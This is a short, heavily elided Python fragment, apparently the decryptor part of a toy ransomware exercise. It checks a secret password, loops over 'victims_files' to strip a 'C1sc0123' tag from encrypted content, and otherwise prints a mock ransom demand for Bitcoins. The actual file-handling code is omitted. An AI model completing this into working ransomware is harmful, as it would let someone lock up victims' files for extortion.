...
if secretAccess == secretPass:
        ...
        for file in victims_files:
                ...
                #we need the normal read mode so that regex can discern and remove the tag ("C1sc0123"") from the encrypted content
                with open(file, 'w') as thefile:
                        #regex specifies any single/string of chars that ends with "C1sc0123". 
        ...
        input('Thank you for playing! :D')

else:
        input('Send 1 million Bitcoins fool!')